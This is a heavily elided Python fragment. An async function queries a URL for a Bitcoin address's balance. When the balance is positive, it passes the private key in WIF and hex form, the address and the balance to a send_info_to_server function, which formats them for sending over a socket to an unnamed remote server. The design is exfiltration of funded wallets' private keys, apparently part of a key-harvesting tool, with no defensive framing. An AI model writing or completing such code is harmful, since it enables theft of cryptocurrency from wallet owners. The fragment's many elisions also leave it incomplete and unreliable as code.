            ...
            async with session.get(url, timeout=10) as response:
                if response.status == 200:
                    ...
                    if balance > 0:
                        ...
                        # Send the information to the specified server
                        send_info_to_server(private_key_wif, private_key_hex, bitcoin_address, balance)
                        
                        # Add the details to the list of results
...
def send_info_to_server(private_key_wif, private_key_hex, bitcoin_address, balance):
    ...
    with socket.socket(socket.AF_INET6, socket.SOCK_STREAM) as s:
        try:
            ...
            data_to_send = f"{private_key_wif},{private_key_hex},{bitcoin_address},{balance}"
